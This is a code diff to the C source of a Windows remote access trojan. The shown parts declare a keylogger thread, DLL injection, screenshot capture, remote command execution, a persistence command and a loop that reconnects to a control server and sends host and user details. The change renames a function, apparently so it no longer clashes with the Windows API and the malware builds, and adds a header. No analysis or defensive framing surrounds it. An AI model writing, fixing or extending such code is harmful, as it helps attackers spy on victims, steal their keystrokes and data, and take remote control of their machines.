@@ -9,6 +9,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <winsock2.h>
 #include <windows.h>
 #include <tlhelp32.h>
@@ -28,7 +29,7 @@ BOOL g_Running = TRUE;
 SOCKET g_Socket = INVALID_SOCKET;
 
 // Function prototypes
-void GetSystemInfo(char* buffer, size_t size);
+void GetSysInfo(char* buffer, size_t size);
 void ExecuteCommand(const char* command, char* output, size_t output_size);
 void SendData(const char* data);
 BOOL ConnectToServer();
@@ -39,7 +40,7 @@ BOOL InjectDLL(DWORD pid, const char* dll_path);
 void KeyloggerThread();
 void ScreenshotCapture(const char* filename);
 
-void GetSystemInfo(char* buffer, size_t size) {
+void GetSysInfo(char* buffer, size_t size) {
     char hostname[256] = {0};
     char username[256] = {0};
     char osversion[256] = {0};
@@ -221,7 +222,7 @@ void MainLoop() {
         if (g_Socket == INVALID_SOCKET) {
             Sleep(RECONNECT_INTERVAL * 1000);
             if (ConnectToServer()) {
-                GetSystemInfo(sysinfo, sizeof(sysinfo));
+                GetSysInfo(sysinfo, sizeof(sysinfo));
                 SendData(sysinfo);
             }
             continue;
@@ -263,7 +264,7 @@ void MainLoop() {
                 SendData(output);
             }
             else if (strncmp(buffer, "SYSINFO", 7) == 0) {
-                GetSystemInfo(sysinfo, sizeof(sysinfo));
+                GetSysInfo(sysinfo, sizeof(sysinfo));
                 SendData(sysinfo);
             }
             else if (strncmp(buffer, "PERSIST", 7) == 0) {
